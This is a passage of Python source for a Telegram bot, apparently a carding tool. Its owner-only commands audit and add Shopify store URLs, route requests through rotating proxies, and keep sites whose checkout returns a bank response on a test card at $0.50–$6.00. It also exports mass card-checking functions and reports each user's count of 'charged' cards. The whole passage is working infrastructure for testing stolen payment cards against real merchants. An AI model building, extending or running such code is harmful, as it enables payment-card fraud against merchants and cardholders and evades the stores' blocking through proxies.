                "connection error" in resp.lower() or
                "proxy error" in resp.lower()):
            _sc_mark_bad(proxy)
            if attempt < MAX_TRIES - 1:
                await asyncio.sleep(0.4)
                continue
            return site, "REMOVE", {"Price": -1.0}, resp

        # Gateway must be Shopify Payments
        if gw.upper().strip() != "SHOPIFY PAYMENTS":
            return site, "REMOVE", {"Price": -1.0}, f"Gateway Rejected ({gw})"

        # ORDER_PAID on test card → blocked site
        if "ORDER_PAID" in resp_up or resp_up.replace(" ", "") == "PAID":
            return site, "REMOVE", {"Price": -1.0}, "ORDER_PAID - Blocked"

        # Check for dead-site errors
        if _is_dead_site_response(resp):
            return site, "REMOVE", {"Price": -1.0}, resp

        # Valid bank response
        if _is_success_response(resp):
            try:
                actual_price = float(re.sub(r"[^\d.]", "", str(price_str)))
            except Exception:
                actual_price = -1.0
            # Price must be $0.50–$6.00
            if 0.50 < actual_price <= 6.00:
                return site, "KEEP", {"Price": actual_price}, f"${actual_price:.2f} | {resp}"
            else:
                return site, "REMOVE", {"Price": actual_price}, f"Price ${actual_price:.2f} (Rejected) | {resp}"

        return site, "REMOVE", {"Price": -1.0}, f"Unknown Response: {resp}"

    return site, "ERROR", {"Price": -1.0}, "Max Retries Reached"

# ── bulk runner ───────────────────────────────────────────────────────────

_SC_FILE_LOCK = asyncio.Lock()

async def _sc_run_checker(bot, chat_id: int, sites_to_check: list,
                          command_name: str = "Audit",
                          status_message_id: int = None):
    """Run the site checker; saves/sends report when done."""
    global _SC_BAD_PROXIES
    _SC_BAD_PROXIES.clear()
    # Reload proxies if needed
    if not _ALL_PROXIES:
        _load_proxies()

    total          = len(sites_to_check)
    valid_sites    = []
    working_lines  = []
    dead_lines     = []
    checked        = 0
    live_count     = 0
    dead_count     = 0
    dup_count      = 0
    last_edit      = 0.0
    MIN_EDIT_INT   = 2.0
    sem            = asyncio.Semaphore(50)

    existing: set = set()
    if command_name == "Adding":
        existing = set(await asyncio.to_thread(_sc_read_sites))

    async def _worker(site):
        async with sem:
            return await _sc_check_site(site)

    tasks = [_worker(s) for s in sites_to_check]

    for fut in asyncio.as_completed(tasks):
        try:
            site, status, data, msg = await fut
        except Exception as e:
            checked    += 1
            dead_count += 1
            dead_lines.append(f"{site} | Error: {e}")
            continue

        checked += 1
        norm    = _sc_normalize_url(site)

        if status == "KEEP":
            if command_name == "Adding":
                if norm in existing:
                    dup_count += 1
                else:
                    # Append immediately
                    async with _SC_FILE_LOCK:
                        if norm not in existing:
                            def _app():
                                with open("sites.txt", "a", encoding="utf-8") as fh:
                                    fh.write(f"{site}\n")
                            await asyncio.to_thread(_app)
                            existing.add(norm)
                            live_count += 1
                            valid_sites.append(site)
                            price = data.get("Price", "0.00")
                            price_s = f"${price:.2f}" if isinstance(price, float) else str(price)
                            working_lines.append(f"{site} | Price: {price_s} | Response: {msg}")
                        else:
                            dup_count += 1
            else:
                live_count += 1
                valid_sites.append(site)
                price = data.get("Price", "0.00")
                price_s = f"${price:.2f}" if isinstance(price, float) else str(price)
                working_lines.append(f"{site} | Price: {price_s} | Response: {msg}")
        else:
            dead_count += 1
            dead_lines.append(f"{site} | {msg}")

        # Progress update
        now = time.time()
        if (now - last_edit > MIN_EDIT_INT or checked % 10 == 0) and status_message_id:
            try:
                dup_txt = ""
                if dup_count > 0:
                    dup_txt = (f'\n<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
                               f' Duplicates ➳</b> <code>{dup_count}</code>')
                px_total = len(_ALL_PROXIES) or 1
                px_avail = px_total - len(_SC_BAD_PROXIES)
                await bot.edit_message_text(
                    chat_id=chat_id, message_id=status_message_id,
                    text=(
                        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
                        f' {command_name}ing {total} Sites...</b>\n'
                        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
                        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
                        f' Kept (&gt;$0–$5) ➳</b> <code>{live_count}</code>\n'
                        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
                        f' Rejected ➳</b> <code>{dead_count}</code>\n'
                        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
                        f' Checked ➳</b> <code>{checked}/{total}</code>\n'
                        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
                        f' Proxies ➳</b> <code>{px_avail}/{px_total}</code>'
                        f'{dup_txt}'
                    ),
                    parse_mode="HTML",
                )
                last_edit = now
            except Exception:
                pass

    # ── Final dedup for Audit mode ───────────────────────────────────────
    final_sites: list = []
    seen_norms: set   = set()
    for s in valid_sites:
        n = _sc_normalize_url(s)
        if n not in seen_norms:
            seen_norms.add(n)
            final_sites.append(s)
    removed_dupes = len(valid_sites) - len(final_sites)

    if command_name == "Audit":
        saved = await asyncio.to_thread(_sc_write_sites, final_sites)
    else:
        saved = len(final_sites)

    # ── Build report file ─────────────────────────────────────────────────
    ts       = int(time.time())
    fname    = f"sitechk_{command_name.lower()}_{ts}.txt"
    total_dup = dup_count + removed_dupes
    lines = [
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"TOTAL CHECKED: {total}",
        f"WORKING SITES (>$0–$5): {len(final_sites)}",
        f"REJECTED: {dead_count}",
    ]
    if total_dup > 0:
        lines.append(f"DUPLICATES SKIPPED: {total_dup}")
    px_total = len(_ALL_PROXIES) or 0
    lines += [
        f"PROXIES USED: {px_total} | BAD: {len(_SC_BAD_PROXIES)}",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"✅ WORKING SITES ({len(working_lines)})",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "\n".join(working_lines) if working_lines else "No valid sites found.",
        "",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        f"❌ DEAD / REJECTED ({len(dead_lines)})",
        "━━━━━━━━━━━━━━━━━━━━━━━━━━",
        "\n".join(dead_lines) if dead_lines else "No dead sites.",
    ]
    report_content = "\n".join(lines)

    try:
        def _write_report():
            with open(fname, "w", encoding="utf-8") as fh:
                fh.write(report_content)
        await asyncio.to_thread(_write_report)

        dup_final = ""
        if total_dup > 0:
            dup_final = (f'\n<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
                         f' Duplicates Blocked ➳</b> <code>{total_dup}</code>')
        doc_caption = (
            f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
            f' {command_name} Complete!</b>\n\n'
            f'<b>Total Checked ➳</b> <code>{total}</code>\n'
            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
            f' Valid (&gt;$0–$5) ➳</b> <code>{len(final_sites)}</code>\n'
            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
            f' Rejected ➳</b> <code>{dead_count}</code>\n'
            f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
            f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
            f' Proxies Used ➳</b> <code>{px_total}</code>'
            f' | Bad ➳ <code>{len(_SC_BAD_PROXIES)}</code>'
            f'{dup_final}'
        )
        await bot.send_document(
            chat_id=chat_id,
            document=InputFile(fname),
            caption=doc_caption,
            parse_mode="HTML",
        )
        try:
            _os.remove(fname)
        except Exception:
            pass
    except Exception as e:
        await bot.send_message(
            chat_id=chat_id,
            text=(f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
                  f' Error ➳</b> <code>{escape(str(e)[:100])}</code>'),
            parse_mode="HTML",
        )


# ── /sitechk ─────────────────────────────────────────────────────────────

async def cmd_sitechk(update: Update,
                      context: ContextTypes.DEFAULT_TYPE):
    """Audit existing sites — remove dead ones and deduplicate."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    sites = await asyncio.to_thread(_sc_read_sites)
    if not sites:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
            f' No sites found in sites.txt</b>',
            parse_mode="HTML",
        )
        return

    px_total = len(_ALL_PROXIES) or len(_load_proxies())
    status_msg = await update.message.reply_text(
        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
        f' Starting Audit on {len(sites)} Sites...</b>\n'
        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
        f' Checked ➳</b> <code>0/{len(sites)}</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
        f' Kept (&gt;$0–$5) ➳</b> <code>0</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
        f' Rejected ➳</b> <code>0</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
        f' Proxies ➳</b> <code>{px_total}</code>',
        parse_mode="HTML",
    )
    asyncio.create_task(_sc_run_checker(
        context.bot, update.effective_chat.id,
        sites, "Audit", status_msg.message_id,
    ))


# ── /addsite ─────────────────────────────────────────────────────────────

async def cmd_addsite(update: Update,
                      context: ContextTypes.DEFAULT_TYPE):
    """Add new sites from an uploaded file — skips duplicates."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    msg = update.message
    doc = msg.document
    if not doc and msg.reply_to_message:
        doc = msg.reply_to_message.document

    if not doc:
        await msg.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
            f' Please upload a .txt file or reply to one with /addsite.</b>',
            parse_mode="HTML",
        )
        return

    try:
        from io import BytesIO as _BytesIO
        file_info   = await context.bot.get_file(doc.file_id)
        buf         = _BytesIO()
        await file_info.download_to_memory(buf)
        buf.seek(0)
        text = buf.read().decode("utf-8", errors="ignore")

        url_pat   = r"(https?://\S+)"
        new_sites = []
        for line in text.split("\n"):
            m = re.search(url_pat, line)
            if m:
                u = m.group(1).rstrip(".,;:!?)\"'")
                new_sites.append(u)
        new_sites = list(set(new_sites))

        if not new_sites:
            await msg.reply_text(
                f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
                f' No valid URLs found in the file.</b>',
                parse_mode="HTML",
            )
            return
    except Exception as e:
        logging.error(f"[ADDSITE] file read error: {e}", exc_info=True)
        await msg.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
            f' Error reading file ➳</b> <code>{escape(str(e)[:80])}</code>',
            parse_mode="HTML",
        )
        return

    px_total   = len(_ALL_PROXIES) or len(_load_proxies())
    status_msg = await msg.reply_text(
        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
        f' Starting Addition of {len(new_sites)} Sites...</b>\n'
        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
        f'<b><tg-emoji emoji-id="{_SC_PROG_EID}">🔄</tg-emoji>'
        f' Checked ➳</b> <code>0/{len(new_sites)}</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
        f' Added (&gt;$0–$5) ➳</b> <code>0</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
        f' Rejected ➳</b> <code>0</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
        f' Duplicates ➳</b> <code>0</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
        f' Proxies ➳</b> <code>{px_total}</code>',
        parse_mode="HTML",
    )
    asyncio.create_task(_sc_run_checker(
        context.bot, update.effective_chat.id,
        new_sites, "Adding", status_msg.message_id,
    ))


# ── /siteall ─────────────────────────────────────────────────────────────

async def cmd_siteall(update: Update,
                      context: ContextTypes.DEFAULT_TYPE):
    """Download the full deduplicated list of sites."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    sites = await asyncio.to_thread(_sc_read_sites)
    if not sites:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
            f' sites.txt is empty.</b>',
            parse_mode="HTML",
        )
        return

    fname = f"sites_full_{int(time.time())}.txt"
    try:
        def _write():
            with open(fname, "w", encoding="utf-8") as fh:
                fh.write(f"Total Sites: {len(sites)} (Deduplicated)\n\n")
                fh.write("\n".join(sites))
        await asyncio.to_thread(_write)

        await update.message.reply_document(
            document=InputFile(fname),
            caption=(
                f'<b><tg-emoji emoji-id="{_SC_REPORT_EID}">📜</tg-emoji>'
                f' Total Sites ➳</b> <code>{len(sites)}</code>'
                f' <tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
                f' (No Duplicates)'
            ),
            parse_mode="HTML",
        )
        try:
            _os.remove(fname)
        except Exception:
            pass
    except Exception as e:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
            f' Error ➳</b> <code>{escape(str(e)[:100])}</code>',
            parse_mode="HTML",
        )


# ── /dedupe ───────────────────────────────────────────────────────────────

async def cmd_dedupe(update: Update,
                     context: ContextTypes.DEFAULT_TYPE):
    """Force-deduplicate sites.txt."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    sites = await asyncio.to_thread(_sc_read_sites)
    if not sites:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_ERRORS_EID}">⚠️</tg-emoji>'
            f' sites.txt is empty.</b>',
            parse_mode="HTML",
        )
        return

    original = len(sites)
    final    = await asyncio.to_thread(_sc_write_sites, sites)
    removed  = original - final

    if removed > 0:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
            f' Deduplication Complete!</b>\n\n'
            f'<b>Original ➳</b> <code>{original}</code>\n'
            f'<b><tg-emoji emoji-id="{_SC_DUPE_EID}">🚫</tg-emoji>'
            f' Removed ➳</b> <code>{removed}</code> duplicates\n'
            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
            f' Final ➳</b> <code>{final}</code> unique sites',
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
            f' No duplicates found!</b>\n\n'
            f'<b>Total Sites ➳</b> <code>{final}</code> (All Unique)',
            parse_mode="HTML",
        )


# ── /proxyinfo ────────────────────────────────────────────────────────────

async def cmd_proxyinfo(update: Update,
                        context: ContextTypes.DEFAULT_TYPE):
    """Show proxy statistics (loaded from px.txt)."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    if not _ALL_PROXIES:
        _load_proxies()
    avail   = len(_ALL_PROXIES) - len(_SC_BAD_PROXIES)
    px_list = _ALL_PROXIES

    text = (
        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
        f' Proxy Information (from px.txt)</b>\n'
        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n'
        f'<b><tg-emoji emoji-id="{_SC_STATS_EID}">📊</tg-emoji>'
        f' Total Proxies ➳</b> <code>{len(px_list)}</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
        f' Available ➳</b> <code>{avail}</code>\n'
        f'<b><tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji>'
        f' Bad/Dead ➳</b> <code>{len(_SC_BAD_PROXIES)}</code>\n'
        f'<b>━━━━━━━━━━━━━━━━━━━━━━</b>\n\n'
    )

    if px_list:
        preview = 20
        for i, px in enumerate(px_list[:preview], 1):
            if px in _SC_BAD_PROXIES:
                status_icon = f'<tg-emoji emoji-id="{_SC_DEAD_EID}">❌</tg-emoji> Dead'
            else:
                status_icon = f'<tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji> Live'
            if "@" in px:
                host_part = px.split("@")[1] if "@" in px else px
                text += f"<code>{i}.</code> {escape(host_part)} — {status_icon}\n"
            else:
                text += f"<code>{i}.</code> {escape(px[:30])}... — {status_icon}\n"
        if len(px_list) > preview:
            text += f"\n... and {len(px_list) - preview} more."
    else:
        text += "<i>No proxies found in px.txt</i>"

    await update.message.reply_text(text, parse_mode="HTML")


# ── /resetproxy ───────────────────────────────────────────────────────────

async def cmd_resetproxy(update: Update,
                         context: ContextTypes.DEFAULT_TYPE):
    """Reset the bad-proxy cache."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        await update.message.reply_text(
            f'<b><tg-emoji emoji-id="{_SC_DENY_EID}">⛔</tg-emoji>'
            f' You are not authorized.</b>',
            parse_mode="HTML",
        )
        return

    global _SC_BAD_PROXIES
    cleared = len(_SC_BAD_PROXIES)
    _SC_BAD_PROXIES.clear()

    # Re-load proxies from disk too
    _load_proxies()

    await update.message.reply_text(
        f'<b><tg-emoji emoji-id="{_SC_LIVE_EID}">✅</tg-emoji>'
        f' Proxy List Reset!</b>\n\n'
        f'<b><tg-emoji emoji-id="{_SC_DONE_EID}">✨</tg-emoji>'
        f' Cleared ➳</b> <code>{cleared}</code> bad proxies\n'
        f'<b><tg-emoji emoji-id="{_SC_GATE_EID}">🌐</tg-emoji>'
        f' Available Now ➳</b> <code>{len(_ALL_PROXIES)}</code>',
        parse_mode="HTML",
    )


def get_sitechk_handlers() -> list:
    """Return all sitechk PTB CommandHandlers for registration in main.py."""
    return [
        CommandHandler("sitechk",   cmd_sitechk),
        CommandHandler("addsite",   cmd_addsite),
        CommandHandler("siteall",   cmd_siteall),
        CommandHandler("dedupe",    cmd_dedupe),
        CommandHandler("proxyinfo", cmd_proxyinfo),
        CommandHandler("resetproxy",cmd_resetproxy),
    ]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /me — user's lifetime charged card stats
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_ME_CROWN_EID = "6181649972757271368"   # ⚜
_ME_SMILE_EID = "6264538349034281099"   # 😃
_ME_KING_EID  = "6271506980716680365"   # 👑


async def cmd_me(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the calling user's lifetime CHARGED card count."""
    user    = update.effective_user
    ud      = _get_ud(user.id, context)
    charged = ud.get("total_charged", 0)

    if getattr(user, "username", None):
        display = f"@{user.username}"
    else:
        display = user.first_name or "User"

    mb = MsgBuilder()
    # Line 1: ⚜Total charge cards➳{count}
    mb.emoji("6181649972757271368", "⚜")
    mb.bold(f"Total charge cards➳{charged}")
    mb.nl()
    # Line 2: 😃{display}
    mb.emoji("6264538349034281099", "😃")
    mb.italic(display)
    mb.nl()
    # Line 3: 👑Bot➳@Batxchk_bot
    mb.emoji("6271506980716680365", "👑")
    mb.bold("Bot➳")
    mb.mention("@Batxchk_bot")

    text, entities = mb.build()
    await update.message.reply_text(text, entities=entities)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# EXPORT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_sh_handler() -> CommandHandler:
    return CommandHandler("sh", cmd_sh)

def get_me_handler() -> CommandHandler:
    return CommandHandler("me", cmd_me)

__all__ = [
    "get_sh_handler",
    "get_me_handler",
    "_check_card_with_retry", "SITE_RETRIES", "SITE_TIMEOUT",
    "MSH_SESSIONS", "run_mass_batch", "create_msh_session",
    "cb_msh_result", "cb_msh_stop", "build_result_msg",
    "_load_sites", "_load_proxies",
    # Site prober exports
    "probe_all_sites", "get_working_sites",
    "start_probe_background", "stop_probe_background",
    "_WORKING_SITES", "_PROBE_IN_PROGRESS",
    # Message sender — shared with mst.py
    "_send_as_media", "_get_sticker_fid",
    # Sticker stubs — imported by main.py and mst.py
    "_send_sticker", "get_random_live_emoji",
    # Sitechk handlers
    "get_sitechk_handlers",
]
